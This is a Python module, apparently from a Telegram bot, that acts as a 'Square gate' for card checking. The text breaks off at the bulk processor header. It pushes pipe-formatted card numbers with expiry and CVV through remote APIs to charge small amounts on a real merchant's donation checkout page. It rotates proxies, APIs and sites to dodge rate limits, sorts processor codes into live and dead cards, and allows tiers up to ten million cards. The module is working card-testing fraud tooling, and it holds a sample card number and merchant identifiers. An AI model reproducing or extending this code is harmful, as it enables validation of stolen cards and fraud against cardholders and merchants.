"""
sqcharge.py — Square gate module (v78)

v78 — REAL PROCESSOR CODE RULE:
  `status` in every result is the processor's REAL code verbatim
  (GENERIC_DECLINE, CARD_DECLINED_VERIFICATION_REQUIRED, CARD_EXPIRED,
  PAN_FAILURE, ...). The friendly label travels separately in
  `status_group` (3DS_REQUIRED / DECLINED / EXPIRED_CARD / ...).
  Works with sqapi v4.2.1+ (status_group/error_code/http_status/three_ds
  fields) AND older APIs (re-derives the real code from raw.errors).

Wraps the v3.0 sqapi (checker.check_one_sync / check_multi_sync) so the bot
can call it the same way it calls shopify_check_card / st1_check_card.

Public API (matches the whop/shopify/st1 module shape):

  square_check_card(card_str, user_id=None, user_name="", user_uname="",
                     amount_cents=100, proxy=None, site_url=None,
                     priority=True) -> dict
  square_bulk_check_card(card_str, user_id=None, ..., amount_cents=100,
                          proxy=None, site_url=None) -> dict
  _square_bulk_processor(all_ccs, user_id, user_name, user_uname,
                          chat_id, status_msg, stop_key,
                          amount_cents=100, proxy=None, site_url=None)
  _square_bulk_stop_key(chat_id, user_id) -> str
  _square_format_message(result, user_link_html="", cc_str="", bin_info=None,
                          amount_cents=100) -> str
  _square_log_check(result, user_id, user_name, user_uname)
  _square_save_dec_appr(card, result, user_id, user_name, user_uname)
  _send_square_hit_channel(*, price, elapsed, user_id, user_name, user_uname,
                            amount_cents=100, response="", reason="")

Returned dict shape (always the same keys, always JSON-safe):
  {
    "status":            "APPROVED" | "DECLINED" | "INVALID_CARD" |
                         "CVV_MISMATCH" | "INSUFFICIENT_FUNDS" |
                         "EXPIRED_CARD" | "TRANSACTION_LIMIT" |
                         "3DS_REQUIRED" | "SESSION_EXPIRED" | "ERROR" | "UNKNOWN",
    "card":              "4707930541205163|09|2026|942",
    "card_brand":        "VISA" | "MASTERCARD" | "AMEX" | "DISCOVER" | "UNKNOWN",
    "price":             "$1.00",
    "elapsed":           12.34,
    "response":          "Payment ID: <id>" or "Authorization error: 'PAN_FAILURE'",
    "reason":            "Payment Successful" or "Invalid card" or "Incorrect CVV" ...,
    "site":              "https://checkout.square.site/...",
    "merchant_id":       "MLTWCNP4QSWS3",
    "checkout_id":        "GSOWJVODOOZ6A4HEXCXHG4BM",
    "amount_cents":      100,
    "is_charged":        True/False,
    "is_approved":       True/False,
    "raw":               { ... full Square processor response ... },
    "display_response":  "COMPLETED" / "PAN_FAILURE" / "CVV_FAILURE" / ...,
  }
"""

from __future__ import annotations

import os
import re
import time
import json
import random
import asyncio
import threading
import traceback
from typing import Optional, Dict, Any, List

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# API URLs (one per line — the bot calls <base>/check?site=...&card=...&proxy=...&amount=...)
SQUARE_APIS_FILE        = os.path.join(BASE_DIR, "sqapis.txt")
SQUARE_SITES_FILE       = os.path.join(BASE_DIR, "sqsites.txt")
SQUARE_LOGS_FILE        = os.path.join(BASE_DIR, "square_logs.txt")
SQUARE_DEC_APPROVED_FILE = os.path.join(BASE_DIR, "square_dec&approved.txt")

SQUARE_GATE_LABEL       = "Square"
SQUARE_REQUESTS_PER_API = 1   # sequential — Square rate-limits hard

# Per-tier card limits (the bot enforces these in /msq)
# v75 spec: key-redeemed 10-200, admin 10-500, owner 10-10,000,000
SQUARE_USER_MIN_CARDS   = 10
SQUARE_USER_MAX_CARDS   = 200       # key-redeemed users
SQUARE_ADMIN_MAX_CARDS  = 500       # admins
SQUARE_OWNER_MAX_CARDS  = 10_000_000  # owner

# /sq accepts 1-20 cards inline, checked SEQUENTIALLY (v78 user spec)
SQUARE_SINGLE_MAX_CARDS = 20

# Bulk processor: 3 concurrent requests per API
SQUARE_BULK_PER_API     = 3
SQUARE_BULK_PER_API_MAX = 3

# Default Square checkout URL — used when sqsites.txt is empty.
# This is the Studio Texas donation page (the one we tested against).
SQUARE_DEFAULT_SITE = (
    "https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM"
)

# Default sqapi base URL — used when sqapis.txt is empty.
# Replace with your own deployed sqapi instance.
SQUARE_DEFAULT_API = "https://sqapi.example.up.railway.app"

# Per-API request timeout (seconds). Square charges take ~7-25s. We give a
# small buffer so slow-but-legit responses still come through. v76.
SQUARE_API_TIMEOUT = 30.0

# Bulk request cutoff (seconds) — kill a hanging API after this.
SQUARE_BULK_REQUEST_CUTOFF = 30.0

# v76 — Max retries per card. Each retry uses a DIFFERENT proxy + API + site.
# Capped at 5 so a single card never makes more than 5 API calls (prevents
# the "Square 429" flood that happened with 36 retries on a 34-proxy pool).
SQUARE_MAX_RETRIES = 5

# v76 — Max concurrent workers in bulk mode. One card per API at a time.
# With 5 sqapi instances, this means at most 5 concurrent requests to Square
# — well under the rate-limit threshold.
SQUARE_MAX_CONCURRENCY = 5


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import logging
log = logging.getLogger("square")
if not log.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("%(asctime)s [square] %(levelname)s %(message)s"))
    log.addHandler(h)
log.setLevel(logging.INFO)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE LOADERS  — sqapis.txt + sqsites.txt (cached + auto-reload)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_square_apis_cache: list[str] = []
_square_apis_cache_mtime: float = 0.0
_square_apis_last_scan: float = 0.0

_square_sites_cache: list[str] = []
_square_sites_cache_mtime: float = 0.0


def _ensure_square_files() -> None:
    """Create sqapis.txt + sqsites.txt with defaults if missing."""
    try:
        if not os.path.isfile(SQUARE_APIS_FILE):
            with open(SQUARE_APIS_FILE, "w", encoding="utf-8") as f:
                f.write("# sqapis.txt — Square charger API base URLs (one per line)\n")
                f.write("# The bot calls <base>/check?site=...&card=...&proxy=...&amount=...\n")
                f.write("# Lines starting with # are ignored.\n")
                f.write(SQUARE_DEFAULT_API + "\n")
            log.info("created sqapis.txt with default API")
    except Exception as e:
        log.error("failed to create sqapis.txt: %s", e)

    try:
        if not os.path.isfile(SQUARE_SITES_FILE):
            with open(SQUARE_SITES_FILE, "w", encoding="utf-8") as f:
                f.write("# sqsites.txt — Square checkout URLs (one per line)\n")
                f.write("# Format: https://checkout.square.site/merchant/<MID>/checkout/<CID>\n")
                f.write("# Lines starting with # are ignored.\n")
                f.write(SQUARE_DEFAULT_SITE + "\n")
            log.info("created sqsites.txt with default site")
    except Exception as e:
        log.error("failed to create sqsites.txt: %s", e)


def _load_square_apis() -> list[str]:
    """Load Square API base URLs from sqapis.txt (auto-reloads every 30s)."""
    global _square_apis_cache, _square_apis_cache_mtime, _square_apis_last_scan
    _ensure_square_files()
    now = time.time()
    if _square_apis_cache and (now - _square_apis_last_scan) < 30.0:
        return _square_apis_cache
    _square_apis_last_scan = now
    try:
        mt = os.path.getmtime(SQUARE_APIS_FILE)
    except OSError:
        return list(_square_apis_cache)
    if _square_apis_cache and mt == _square_apis_cache_mtime:
        return _square_apis_cache
    out: list[str] = []
    seen: set[str] = set()
    try:
        with open(SQUARE_APIS_FILE, "r", encoding="utf-8") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "#" in line:
                    line = line.split("#", 1)[0].strip()
                if not line:
                    continue
                if not line.startswith(("http://", "https://")):
                    line = "https://" + line
                line = line.rstrip("/")
                if line and line not in seen:
                    seen.add(line)
                    out.append(line)
    except Exception as e:
        log.error("failed to read sqapis.txt: %s", e)
    if out:
        if out != _square_apis_cache:
            log.info("%d APIs loaded from sqapis.txt", len(out))
        _square_apis_cache = out
        _square_apis_cache_mtime = mt
    elif _square_apis_cache:
        return list(_square_apis_cache)
    return list(_square_apis_cache)


def _load_square_sites() -> list[str]:
    """Load Square checkout URLs from sqsites.txt (auto-reloads on change)."""
    global _square_sites_cache, _square_sites_cache_mtime
    _ensure_square_files()
    try:
        mt = os.path.getmtime(SQUARE_SITES_FILE)
    except OSError:
        return list(_square_sites_cache)
    if _square_sites_cache and mt == _square_sites_cache_mtime:
        return _square_sites_cache
    out: list[str] = []
    seen: set[str] = set()
    try:
        with open(SQUARE_SITES_FILE, "r", encoding="utf-8") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "#" in line:
                    line = line.split("#", 1)[0].strip()
                if not line:
                    continue
                if not line.startswith(("http://", "https://")):
                    line = "https://" + line
                line = line.rstrip("/")
                if line and line not in seen:
                    seen.add(line)
                    out.append(line)
    except Exception as e:
        log.error("failed to read sqsites.txt: %s", e)
    if out:
        _square_sites_cache = out
        _square_sites_cache_mtime = mt
        log.info("loaded %d sites from sqsites.txt", len(out))
    return list(_square_sites_cache)


def _pick_random_square_site() -> str:
    """Return a random Square checkout URL from sqsites.txt."""
    sites = _load_square_sites()
    if not sites:
        return SQUARE_DEFAULT_SITE
    import random
    return random.choice(sites)


def filter_expired_cards(ccs: list) -> tuple[list, list]:
    """v78 — Auto-cut expired cards BEFORE checking (user spec: MUST).

    A card is expired when its MM/YY is before the CURRENT month.
    Returns (valid_cards, expired_cards). Cards with unparseable dates
    are kept — the processor gets the final word.
    """
    import calendar as _cal
    try:
        from datetime import datetime as _dtmod
        now = _dtmod.now()
    except Exception:
        return list(ccs), []
    valid: list = []
    expired: list = []
    for cc in ccs:
        parts = str(cc).split("|")
        if len(parts) < 4:
            valid.append(cc)
            continue
        try:
            mm = int(parts[1])
            yy = int(parts[2])
            if yy < 100:
                yy = 2000 + yy
            if mm < 1 or mm > 12:
                expired.append(cc)
                continue
            if yy < now.year or (yy == now.year and mm < now.month):
                expired.append(cc)
                continue
            # expiry month itself is still valid (runs to the last day)
            last_day = _cal.monthrange(yy, mm)[1]
            if last_day < 1:
                expired.append(cc)
                continue
            valid.append(cc)
        except (ValueError, IndexError):
            valid.append(cc)
    return valid, expired


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BULK PROCESSOR STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_SQUARE_BULK_STOP_FLAGS: dict[str, bool] = {}
_SQUARE_BULK_ACTIVE: set[int] = set()
_SQUARE_BULK_LOCK = asyncio.Lock() if False else None  # lazy-init below


def _square_bulk_stop_key(chat_id: int, user_id: int) -> str:
    return f"square:{chat_id}:{user_id}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HTTP CLIENT  — fresh client per request (no global session)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import httpx


def _fresh_client() -> httpx.AsyncClient:
    """Build a fresh httpx.AsyncClient for a single API request.

    v75 — never reuse a client across requests. Square's Cloudflare + the
    sqapi's own internal curl_cffi sessions don't share state cleanly.
    """
    return httpx.AsyncClient(
        timeout=httpx.Timeout(SQUARE_API_TIMEOUT, connect=15.0),
        follow_redirects=False,
        verify=False,
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RESPONSE CLASSIFIER  — map raw sqapi response → (status, response, reason)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Maps Square processor error codes → human-readable reason
_REASON_MAP = {
    "PAN_FAILURE":                 "Invalid card",
    "INVALID_PAN":                 "Invalid card",
    "INVALID_CARD":                "Invalid card",
    "INVALID_CARD_DATA":           "Invalid card",
    "CVV_FAILURE":                 "Incorrect CVV",
    "INCORRECT_CVV":               "Incorrect CVV",
    "INVALID_SECURITY_CODE":       "Incorrect CVV",
    "CVV_MISMATCH":                "Incorrect CVV",
    "EXPIRED_CARD":                        "Expired card",
    "EXPIRED_CARD_FAILURE":                "Expired card",
    "EXPIRATION_FAILURE":                  "Expired card",
    "INSUFFICIENT_FUNDS":          "Insufficient funds — Live CC low funds",
    "INSUFFICIENT_FUNDS_FAILURE": "Insufficient funds — Live CC low funds",
    "GIFT_CARD_AVAILABLE_AMOUNT":  "Insufficient funds — Live CC low funds",
    "GENERIC_DECLINE":             "Card declined by issuer",
    "DECLINE":                     "Card declined by issuer",
    "DECLINED":                    "Card declined by issuer",
    "CARD_DECLINED":               "Card declined by issuer",
    "TRANSACTION_LIMIT":                  "Transaction limit exceeded",
    "TRANSACTION_LIMIT_FAILED":            "Transaction limit exceeded",
    "CARD_VELOCITY":                       "Too many transactions",
    "CARD_VELOCITY_EXCEEDED":              "Too many transactions",
    "PAYMENT_LIMIT_EXCEEDED":               "Payment limit exceeded",
    "CARD_NOT_SUPPORTED":                  "Card not supported",
    "INVALID_REGION":                     "Region not supported",
    "BAD_REQUEST":                         "Bad request — invalid card data",
    "INVALID_REQUEST_ERROR":              "Bad request — invalid card data",
    "INVALID_VALUE":                       "Invalid value — check card format",
    "RATE_LIMITED":                        "Square rate-limited the request",
    "3DS_REQUIRED":                        "3D Secure verification required",
    "AUTHENTICATION_REQUIRED":             "3D Secure verification required",
    "CARD_DECLINED_VERIFICATION_REQUIRED": "3D Secure verification required",
    "VERIFICATION_REQUIRED":               "3D Secure verification required",
    "ADDRESS_VERIFICATION_FAILURE":        "Address verification failed",
}


def _group_from_code(code: str) -> str:
    """v78 — friendly bucket of a REAL processor code (never replaces it)."""
    c = (code or "").upper()
    if not c:
        return "UNKNOWN"
    if c == "SESSION_EXPIRED":
        return "SESSION_EXPIRED"
    if "VERIFICATION_REQUIRED" in c or "3DS" in c or "AUTHENTICATION" in c:
        return "3DS_REQUIRED"
    if "EXPIRED" in c or "EXPIRATION" in c:
        return "EXPIRED_CARD"
    if "INSUFFICIENT" in c:
        return "INSUFFICIENT_FUNDS"
    if "CVV" in c or "SECURITY_CODE" in c:
        return "CVV_MISMATCH"
    if "PAN_FAILURE" in c or "INVALID_PAN" in c or "INVALID_CARD" in c:
        return "INVALID_CARD"
    if "RATE_LIMITED" in c or "BAD_REQUEST" in c or "INVALID_REQUEST" in c:
        return "ERROR"
    if "GENERIC_DECLINE" in c or "DECLIN" in c or "TRANSACTION_LIMIT" in c \
       or "CARD_VELOCITY" in c or "ADDRESS_VERIFICATION" in c or "NOT_SUPPORTED" in c \
       or "INVALID_REGION" in c or "PIN" in c or "PROCESSING_ERROR" in c \
       or "NO_CHECKING" in c or "NO_SAVINGS" in c or "CALL_ISSUER" in c:
        return "DECLINED"
    return c  # unknown real code → the group IS the code (no invention)


_GROUP_REASON = {
    "APPROVED":           "Payment Successful",
    "3DS_REQUIRED":       "3D Secure verification required",
    "EXPIRED_CARD":       "Expired card",
    "INSUFFICIENT_FUNDS": "Insufficient funds — Live CC low funds",
    "CVV_MISMATCH":       "Incorrect CVV",
    "INVALID_CARD":       "Invalid card",
    "DECLINED":           "Card declined by issuer",
    "SESSION_EXPIRED":    "Checkout link expired or invalid",
    "ERROR":              "Square API error",
}


def _classify_square(result: dict, amount_cents: int = 100) -> tuple[str, str, str, str]:
    """v78 — classify a sqapi result into (status, status_group, response, reason).

    THE REAL CODE RULE: `status` is ALWAYS the processor's REAL code verbatim
    (GENERIC_DECLINE, CARD_DECLINED_VERIFICATION_REQUIRED, CARD_EXPIRED,
    PAN_FAILURE, ...). It is NEVER replaced by a generic label — the friendly
    bucket travels separately in `status_group`.

    Works with BOTH sqapi generations:
      * v4.2.1+ returns ready fields:
          status=<REAL CODE>, status_group=<bucket>, error_code=<REAL CODE>,
          http_status=422, three_ds={...}, response=<processor detail>
      * older APIs return mapped labels + raw — the real code is re-derived
        from raw.errors[0].code / payment.card_details.errors[0].code.
    """
    if not isinstance(result, dict):
        return ("ERROR", "ERROR", "No response", "Square API returned non-dict result")

    raw = result.get("raw")
    if not isinstance(raw, dict):
        raw = {}
    payment = raw.get("payment")
    if not isinstance(payment, dict):
        payment = {}
    card_details = payment.get("card_details")
    if not isinstance(card_details, dict):
        card_details = {}
    errs = raw.get("errors") or card_details.get("errors") or []
    if not isinstance(errs, list):
        errs = []
    pay_status = str(payment.get("status", "")).upper()
    cd_status = str(card_details.get("status", "")).upper()

    # ── APPROVED — real success (Square: payment COMPLETED + card CAPTURED) ──
    if pay_status in ("COMPLETED", "APPROVED", "CAPTURED", "AUTHORIZED") or \
       cd_status in ("CAPTURED", "AUTHORIZED", "APPROVED"):
        payment_id = str(payment.get("id", "") or "")
        return ("APPROVED", "APPROVED",
                f"Payment ID: {payment_id}" if payment_id else "Payment Successful",
                "Payment Successful")

    # ── Extract the REAL processor code + detail ─────────────────────────
    err_code = str(result.get("error_code", "") or "").strip().upper()
    err_detail = str(result.get("response", "") or "").strip()
    if err_detail == "-":
        err_detail = ""
    if not err_code and errs and isinstance(errs[0], dict):
        err_code = str(errs[0].get("code", "") or "").strip().upper()
    if not err_detail and errs and isinstance(errs[0], dict):
        err_detail = str(errs[0].get("detail", "") or errs[0].get("message", "") or "").strip()
    if not err_code and pay_status == "FAILED":
        err_code = "GENERIC_DECLINE"
    if err_code and not err_detail:
        err_detail = f"Authorization error: '{err_code}'"

    # ── No processor code present → transport / session layer ───────────
    if not err_code:
        top_status = str(result.get("status", "") or "").upper()
        msg = (err_detail or str(result.get("response", "") or "")).strip()[:200]
        low = msg.lower()
        if "could not be found" in low or "not found" in low or "checkout link" in low:
            return ("SESSION_EXPIRED", "SESSION_EXPIRED", msg or "Checkout link expired or invalid",
                    "Checkout link expired or invalid")
        if top_status == "ERROR" or msg:
            return ("ERROR", "ERROR", msg or "Square API error", "Square API transport error")
        return ("UNKNOWN", "UNKNOWN", msg or "Unknown Square response", "Unclassified Square response")

    # ── REAL processor code — surfaced VERBATIM (v78 core rule) ─────────
    group = str(result.get("status_group", "") or "").strip().upper()
    if not group:
        group = _group_from_code(err_code)
    reason = _REASON_MAP.get(err_code, "") or _GROUP_REASON.get(group, "") \
        or (err_code.replace("_", " ").title() if group == err_code else "Card declined by issuer")
    return (err_code, group, err_detail[:200], reason)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PROXY-ERROR DETECTION  — used to trigger immediate proxy rotation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# These substrings (case-insensitive) inside a result's response/reason
# indicate the proxy itself is burned/blocked — NOT a Square-side issue.
# When detected, we should rotate to a DIFFERENT proxy immediately instead
# of retrying with the same proxy on a different site/API.
_PROXY_ERROR_INDICATORS = (
    "connect tunnel failed",      # curl (7) — proxy refused CONNECT
    "hydrate failed",             # curl_cffi hydration (TLS via proxy) failed
    "curl: (7)",                  # libcurl failed to connect to proxy
    "curl: (35)",                 # SSL connect error through proxy
    "curl: (56)",                 # proxy recv failure
    "curl: (28)",                 # proxy timeout
    "curl: (5)",                  # couldn't resolve proxy
    "response 403",               # proxy returned 403 to CONNECT
    "response 407",               # proxy auth required
    "proxy authentication",
    "proxy connection",
    "could not connect to proxy",
    "proxy connect",
    "tunnel failed",
    "proxy failed",
    "proxy dead",
    "proxy error",
    "proxy burned",
    "change your proxy",
    "unable to connect to proxy",
    "connection refused",
    "connection reset",
    "no proxy",
    "ssl routines",
    "tlsv1 alert",
    "openssl ssl_connect",
    "could not resolve",
    "name or service not known",
    "network is unreachable",
    "host unreachable",
)


def _is_proxy_error(result: dict) -> bool:
    """Check if a Square check result is a proxy-side error (so we should
    rotate to a different proxy before retrying)."""
    if not isinstance(result, dict):
        return False
    status = str(result.get("status", "")).upper()
    if status not in ("ERROR", "UNKNOWN"):
        return False
    response = str(result.get("response", "")).lower()
    reason = str(result.get("reason", "")).lower()
    error = str(result.get("error", "")).lower()
    text = f"{response} {reason} {error}"
    return any(ind in text for ind in _PROXY_ERROR_INDICATORS)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CORE CHECK  — call the sqapi /check endpoint
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _call_sqapi(api_url: str, site: str, card: str, proxy: str,
                       amount_cents: int, timeout: float = SQUARE_API_TIMEOUT) -> Optional[dict]:
    """Call one sqapi instance: GET <api>/check?site=...&card=...&proxy=...&amount=...

    Returns the parsed JSON dict from sqapi, or None on transport failure.
    """
    url = f"{api_url.rstrip('/')}/check"
    params = {
        "site":  site,
        "card":  card,
        "proxy": proxy or "",
        "amount": f"{amount_cents / 100:.2f}",
    }
    headers = {"Accept": "application/json", "X-Session-ID": str(int(time.time() * 1000))}
    try:
        async with _fresh_client() as cli:
            r = await cli.get(url, params=params, headers=headers, timeout=timeout)
        if r.status_code != 200:
            log.warning("sqapi %s -> HTTP %s", api_url, r.status_code)
            return None
        try:
            data = r.json()
        except Exception:
            log.warning("sqapi %s -> non-JSON response", api_url)
            return None
        if not isinstance(data, dict):
            return None
        return data
    except httpx.TimeoutException:
        log.warning("sqapi %s -> timeout", api_url)
        return None
    except httpx.ConnectError:
        log.warning("sqapi %s -> connection refused", api_url)
        return None
    except Exception as e:
        log.error("sqapi %s -> %s", api_url, str(e)[:120])
        return None


async def square_check_card(card_str: str, user_id: Optional[int] = None,
                             user_name: str = "", user_uname: str = "",
                             amount_cents: int = 100, proxy: Optional[str] = None,
                             proxy_pool: Optional[list] = None,
                             site_url: Optional[str] = None,
                             priority: bool = True) -> dict:
    """Charge one card via the sqapi. Returns a normalized result dict.

    v76.1 — One-API-per-attempt, capped retries:
      * Each attempt uses exactly ONE sqapi instance (no fan-out). This was
        the user's explicit request: "every api sends 1 request at a time
        not 3". Previously the first attempt fired all 5 APIs in parallel,
        causing "Square 429" rate-limiting.
      * Max 5 retries per card (SQUARE_MAX_RETRIES). Each retry uses a
        DIFFERENT proxy + DIFFERENT API + DIFFERENT site. Previously with
        a 34-proxy pool the bot would retry 36 times — flooding Square.
      * Per-attempt timeout = 30s. Square charges take 7-25s; 30s gives
        enough buffer for slow-but-legit responses without hanging forever.
      * Total worst-case time per card = 5 × 30s = 150s, but typical
        case is 1 attempt × 7-25s = 7-25s.
    """
    t0 = time.time()
    site = site_url or _pick_random_square_site()

    # ── Build the proxy pool (list of proxy URL strings) ─────────────────
    if proxy_pool is not None:
        pool: list[str] = []
        for p in proxy_pool:
            if not p:
                continue
            if isinstance(p, str):
                s = p.strip()
                if s:
                    pool.append(s)
            elif isinstance(p, dict):
                try:
                    from helpers import proxy_dict_to_url
                    url = proxy_dict_to_url(p)
                    if url:
                        pool.append(url)
                except Exception:
                    pass
    else:
        pool = [proxy] if (proxy and str(proxy).strip()) else []

    # De-duplicate the pool while preserving order
    _seen = set()
    pool = [p for p in pool if not (p in _seen or _seen.add(p))]
    n_proxies = len(pool)

    # Round-robin proxy index
    _proxy_idx = [0]
    def _next_proxy() -> str:
        if not pool:
            return ""
        p = pool[_proxy_idx[0] % len(pool)]
        _proxy_idx[0] += 1
        return p

    # Round-robin API index
    apis = _load_square_apis()
    if not apis:
        return _error_result(card_str, "No sqapi URLs in sqapis.txt", site, amount_cents)

    _api_idx = [0]
    def _next_api() -> str:
        a = apis[_api_idx[0] % len(apis)]
        _api_idx[0] += 1
        return a

    # v76.1 — Cap retries at SQUARE_MAX_RETRIES (5). Even with 34 proxies,
    # we don't try more than 5 — if 5 different proxy+api+site combos all
    # fail, the card isn't going to work.
    MAX_RETRIES = min(SQUARE_MAX_RETRIES, max(1, n_proxies))
    tried_sites: set = set()
    last_result = None
    last_was_proxy_error = False

    current_proxy = _next_proxy()
    current_api = _next_api()

    for attempt in range(MAX_RETRIES):
        # On retry: rotate site, API, AND proxy
        if attempt > 0:
            sites = _load_square_sites()
            untried_sites = [s for s in sites if s not in tried_sites]
            if untried_sites:
                site = random.choice(untried_sites)
            elif sites:
                site = random.choice(sites)
            # v76.1 — ONE API per attempt (no fan-out)
            current_api = _next_api()
            # v76.1 — Rotate proxy on every retry (if we have >1)
            if n_proxies > 1:
                current_proxy = _next_proxy()
            log.info(
                "Square retry %d/%d for %s — site=%s api=%s proxy=%s",
                attempt + 1, MAX_RETRIES, card_str.split("|")[0][:6],
                site[:40], current_api[:40],
                (current_proxy[:30] + "...") if current_proxy else "NONE",
            )

        tried_sites.add(site)

        # v76.1 — Single API call per attempt (NO fan-out)
        chosen = await _call_sqapi(current_api, site, card_str,
                                    current_proxy, amount_cents)

        if not chosen:
            last_result = _error_result(
                card_str, f"sqapi {current_api[:40]} silent",
                site, amount_cents,
            )
            last_was_proxy_error = False
            if attempt < MAX_RETRIES - 1:
                await asyncio.sleep(0.5)
                continue
            break

        status, status_group, response, reason = _classify_square(chosen, amount_cents)
        elapsed = time.time() - t0

        raw = chosen.get("raw", {}) or {}
        payment = (raw.get("payment") or {}) if isinstance(raw, dict) else {}
        card_details = (payment.get("card_details") or {}) if isinstance(payment, dict) else {}
        card_obj = (card_details.get("card") or {}) if isinstance(card_details, dict) else {}
        card_brand = card_obj.get("card_brand") or chosen.get("card_brand") or "UNKNOWN"
        payment_id = payment.get("id", "") if isinstance(payment, dict) else ""
        merchant_id = chosen.get("merchant_id", "")
        checkout_id = chosen.get("checkout_id", "")

        is_approved = (status == "APPROVED" or status_group == "APPROVED")
        is_charged = is_approved

        # v78 — REAL processor code passthrough. `status` is the processor's
        # own code verbatim (GENERIC_DECLINE, CARD_DECLINED_VERIFICATION_REQUIRED,
        # CARD_EXPIRED, ...); the friendly bucket lives in `status_group`.
        result = {
            "status":            status,
            "status_group":      status_group,
            "error_code":        status,
            "http_status":       chosen.get("http_status"),
            "three_ds":          chosen.get("three_ds") or {},
            "card":              card_str,
            "card_brand":        card_brand,
            "price":             f"${amount_cents / 100:.2f}",
            "elapsed":           round(elapsed, 2),
            "response":          response,
            "reason":            reason,
            "display_response":  _display_response(status, status_group, response, payment_id),
            "site":              site,
            "merchant_id":       merchant_id,
            "checkout_id":        checkout_id,
            "amount_cents":      amount_cents,
            "is_charged":        is_charged,
            "is_approved":       is_approved,
            "is_dead":           status_group in ("DECLINED", "INVALID_CARD", "EXPIRED_CARD", "CVV_MISMATCH"),
            "is_retryable":      status_group in ("ERROR", "SESSION_EXPIRED"),
            "gate":              SQUARE_GATE_LABEL,
            "status_code":       status,
            "error":             "" if status_group != "ERROR" else response,
            "raw":               raw,
            "time":              chosen.get("time", ""),
        }

        last_was_proxy_error = _is_proxy_error(result)

        # v76.1 — retry logic:
        #   * Proxy error → retry (rotates proxy+api+site at loop top)
        #   * 429 from Square → retry with different proxy immediately
        #   * Other ERROR → retry up to MAX_RETRIES
        #   * Non-ERROR → return immediately
        if status_group == "ERROR" and attempt < MAX_RETRIES - 1:
            if last_was_proxy_error:
                log.warning(
                    "Square PROXY-ERROR on attempt %d/%d for %s — rotating proxy+api+site",
                    attempt + 1, MAX_RETRIES, card_str.split("|")[0][:6],
                )
                await asyncio.sleep(0.3)
            else:
                log.warning(
                    "Square ERROR on attempt %d/%d for %s — will retry with different site/API/proxy",
                    attempt + 1, MAX_RETRIES, card_str.split("|")[0][:6],
                )
                await asyncio.sleep(1.0)
            last_result = result
            continue

        # Non-ERROR result → return immediately
        return result

    # All retries exhausted — return last result
    return last_result or _error_result(card_str, "All retries exhausted", site, amount_cents)


def _display_response(status: str, status_group: str, response: str, payment_id: str) -> str:
    """v78 — the EXACT processor response shown in the bot message.

    APPROVED → "Payment Successful — ID: <id>".
    Everything else → the REAL processor code verbatim
    (GENERIC_DECLINE, CARD_DECLINED_VERIFICATION_REQUIRED, CARD_EXPIRED, ...).
    Only transport errors fall back to the raw message text.
    """
    if status_group == "APPROVED" and payment_id:
        return f"Payment Successful — ID: {payment_id}"
    if status and status not in ("UNKNOWN", "ERROR"):
        return status                      # ← the REAL code, verbatim
    return response[:120]


def _error_result(card_str: str, msg: str, site: str, amount_cents: int) -> dict:
    return {
        "status":            "ERROR",
        "status_group":      "ERROR",
        "card":              card_str,
        "card_brand":        "?",
        "price":             f"${amount_cents / 100:.2f}",
        "elapsed":           0.0,
        "response":          msg,
        "reason":            "Square API transport error",
        "display_response":  msg[:120],
        "site":              site,
        "merchant_id":       "",
        "checkout_id":        "",
        "amount_cents":      amount_cents,
        "is_charged":        False,
        "is_approved":       False,
        "is_dead":           False,
        "is_retryable":      True,
        "gate":              SQUARE_GATE_LABEL,
        "status_code":       "ERROR",
        "error":             msg,
        "raw":               {},
        "time":              "",
    }


# Alias for back-compat with the bot's expected module shape
async def square_bulk_check_card(card_str: str, user_id: Optional[int] = None,
                                 user_name: str = "", user_uname: str = "",
                                 amount_cents: int = 100, proxy: Optional[str] = None,
                                 proxy_pool: Optional[list] = None,
                                 site_url: Optional[str] = None) -> dict:
    """Same as square_check_card — kept for module-shape compat.
    
    v76: forwards proxy_pool if provided so bulk checks also benefit from
    proxy rotation on ERROR.
    """
    return await square_check_card(card_str, user_id=user_id, user_name=user_name,
                                    user_uname=user_uname, amount_cents=amount_cents,
                                    proxy=proxy, proxy_pool=proxy_pool,
                                    site_url=site_url)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BULK PROCESSOR  — /msq uses this
